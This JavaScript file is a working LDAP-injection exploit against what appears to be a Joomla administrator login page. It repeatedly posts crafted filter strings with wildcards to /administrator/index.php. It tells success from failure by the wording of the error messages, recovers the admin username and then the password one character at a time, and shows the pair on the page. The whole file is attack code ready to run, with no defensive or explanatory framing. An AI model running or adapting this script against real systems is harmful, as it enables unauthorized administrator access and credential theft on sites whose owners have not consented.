var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

var postData = {}
var tplUname = ";uid={0}";
var tplPassword = ";|(uid=none)(password={0})";
var currentLogin = "";
var asterisk = "*";
var err = "Unable to find user.";
var suc = "Username and password do not match or you do not have an account yet.";
// Step 1: brute username
var username = "";
var password = "";

// First, checks if it isn't implemented yet.
if (!String.prototype.format) {
  String.prototype.format = function() {
    var args = arguments;
    return this.replace(/{(\d+)}/g, function(match, number) { 
      return typeof args[number] != 'undefined'
        ? args[number]
        : match
      ;
    });
  };
}

function bruteLogin(uname, index) {
	index = typeof index !== 'undefined' ? index : 0;
	if (index >= charset.length) {
		jQuery('#mod-login-username').val(uname);
		// uname += charset[index]
		username = uname;
		password = brutePassword("");
		return uname;
	}
	jQuery('#form-login input').each(function(n, e) {
		cname = e.name;
		cval = e.value;
		if(e.type == 'password') e.type = 'text';
		postData[cname] = cval;
	});
	postData.username = tplUname.format(uname+charset[index]+asterisk);
	postData.passwd = 'any';
	jQuery('#mod-login-username').val(uname+charset[index]);
	jQuery.post('/administrator/index.php', postData, function(data) {
		if(data.search(suc) != -1) {
			uname += charset[index];
			bruteLogin(uname, 0)
		} else if(data.search(err) != -1 && index > charset.length) {
			return uname;
		} else if(data.search(err) != -1) {
			bruteLogin(uname, ++index);
		}
	});
}

function brutePassword(passwd, index) {
	index = typeof index !== 'undefined' ? index : 0;
	if (index >= charset.length) {
		jQuery('#mod-login-password').val(passwd);
		jQuery('#system-message-container').append('<div class="alert "><div class="alert-message">Username and password found. "'+username+':'+passwd+'</div><div>')
		// passwd += charset[index]
		return passwd;
	}
	jQuery('#form-login input').each(function(n, e) {
		cname = e.name;
		cval = e.value;
		if(e.type == 'password') e.type = 'text';
		postData[cname] = cval;
	});
	postData.username = tplPassword.format(passwd+charset[index]+asterisk);
	postData.passwd = 'any';
	jQuery('#mod-login-password').val(passwd+charset[index]);
	jQuery.post('/administrator/index.php', postData, function(data) {
		if(data.search(suc) != -1) {
			passwd += charset[index];
			brutePassword(passwd, 0)
		} else if(data.search(err) != -1 && index > charset.length) {
			return passwd;
		} else if(data.search(err) != -1) {
			brutePassword(passwd, ++index);
		}
	});
}

bruteLogin("");